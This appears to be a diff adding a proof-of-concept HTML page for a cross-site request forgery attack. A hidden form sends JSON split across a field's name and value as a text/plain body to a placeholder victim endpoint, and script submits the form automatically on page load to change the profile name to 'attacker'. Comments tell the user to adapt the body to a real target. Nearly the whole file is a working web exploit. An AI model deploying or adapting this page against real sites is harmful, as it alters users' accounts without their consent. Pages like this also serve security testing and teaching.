@@ -1,0 +1,32 @@
+<!doctype html>
+<!--
+CSRF PoC: JSON-style CSRF using text/plain with JSON split across name/value.
+Useful if the backend transforms or normalizes the raw text body before JSON parsing.
+-->
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>CSRF text/plain JSON (split)</title>
+  <meta name="referrer" content="no-referrer">
+</head>
+<body>
+  <p>If you see this, the form didn't auto-submit (or was blocked).</p>
+
+  <form id="f" action="https://victim.example/api/endpoint" method="POST" enctype="text/plain">
+    <!-- 
+      Example POST body, don't forget to update to match real target. 
+
+      This works when text/plain is accepted but the server appends an '=' at the end.
+      In this case the end of the JSON would look like: "displayName":"=attacker"}
+    -->
+    <input type="hidden" name='{"action":"updateProfile","displayName":" 'value='attacker"}' />
+  </form>
+
+  <script>
+    window.onload = () => {
+      document.getElementById("f").submit();
+      console.log("SENT CSRF text/plain JSON (split)");
+    };
+  </script>
+</body>
+</html>
